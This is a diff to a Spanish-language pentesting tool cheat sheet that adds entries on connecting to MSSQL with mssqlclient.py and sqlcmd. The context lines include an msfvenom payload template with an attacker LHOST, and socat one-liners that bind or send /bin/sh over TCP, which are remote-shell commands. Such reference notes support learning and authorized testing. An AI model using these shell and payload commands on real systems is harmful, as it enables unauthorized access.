@@ -235,6 +235,16 @@ Herramienta de Metasploit para **generar payloads** en múltiples formatos (PE, 
 - Ética y seguridad: **solo** usar en VMs/labs autorizados; compartir artifacts o utilizarlos fuera de ese scope puede ser ilegal.
 - Ejemplos: `msfvenom -p <meterpreter> LHOST=<ip_atacante> LPORT=<puerto> -f <extensión> > <nombre_archivo>`
 
+### `mssqlclient.py (Impacket)`
+Cliente Python de **Impacket para conectarse e interactuar con Microsoft SQL Server (MSSQL)**.  
+- Permite establecer sesiones interactivas contra MSSQL utilizando diferentes métodos de autenticación, incluyendo **Windows Authentication**.  
+- Resulta especialmente útil en pentesting de entornos Windows/Active Directory cuando se dispone de credenciales válidas para un servidor MSSQL.  
+- `-windows-auth` indica que las credenciales proporcionadas corresponden a una **cuenta de Windows/AD**, en lugar de una cuenta SQL nativa.  
+- Una vez conectado, permite ejecutar consultas SQL directamente en el prompt, por ejemplo `SELECT name FROM sys.databases;`, y dispone de comandos propios que pueden consultarse mediante `help`.  
+- Opciones habituales: `<usuario>@<IP>` para especificar usuario y objetivo, `-windows-auth` para autenticación Windows, `-port` para especificar un puerto MSSQL diferente del predeterminado.  
+- Limitaciones: requiere conectividad con el servicio MSSQL y credenciales con permisos suficientes; algunas funcionalidades dependen de los privilegios de la cuenta utilizada.  
+- Ejemplos: `python3 mssqlclient.py <user>@<IP> -windows-auth`, `python3 mssqlclient.py <user>@<IP> -windows-auth -port 1433`; dentro de la sesión: `SELECT name FROM sys.databases;`
+
 ### `nbtscan`  
 Herramienta para **escanear redes buscando nombres NetBIOS (hosts Windows/SMB)**.  
 - Qué hace: envía consultas NetBIOS sobre una red para enumerar equipos, nombres y direcciones IP.  
@@ -339,6 +349,16 @@ Herramienta multipropósito que permite crear, redirigir y manipular conexiones 
 - Capaz de traducir entre protocolos o tipos de sockets distintos, actuando como puente flexible entre servicios.
 - Funciona como alternativa más avanzada que netcat para depurar servicios, redirigir tráfico y realizar pruebas de red complejas.
 - Ejemplos: `socat TCP:IP_target:PORT EXEC:/bin/sh` · `socat TCP-LISTEN:PORT,fork EXEC:/bin/sh` · `socat TCP-LISTEN:LOCAL_PORT,fork TCP:IP_target:REMOTE_PORT` · `socat OPENSSL:IP_target:PORT STDOUT`
+
+### `sqlcmd`
+Herramienta de línea de comandos de Microsoft para **conectarse y ejecutar consultas contra Microsoft SQL Server**.  
+- Permite autenticarse mediante **SQL Server Authentication** (`-U`/`-P`) o autenticación integrada de Windows (`-E`).  
+- Permite ejecutar consultas SQL directamente desde la terminal mediante `-Q`, además de trabajar de forma interactiva.  
+- `-S` especifica el **servidor/instancia** y permite indicar un puerto, por ejemplo `<IP>,1433`.  
+- Opciones comunes: `-S` servidor, `-U` usuario, `-P` contraseña, `-E` autenticación integrada, `-Q` ejecutar una consulta y salir, `-d` seleccionar una base de datos.  
+- Limitación importante: `-U`/`-P` utilizan **SQL Server Authentication**; si la cuenta es una cuenta de Windows/AD que requiere Windows Authentication, este método puede producir `Login failed for user`.  
+- Ejemplos: `sqlcmd -S <IP>,<PORT> -U <user> -P '<password>' -Q "SELECT name FROM sys.databases;"`, `sqlcmd -S <IP> -E -Q "SELECT name FROM sys.databases;"`
+
 
 ### `sqlmap`  
 Herramienta automatizada para **detección y explotación de vulnerabilidades de SQL Injection**.  
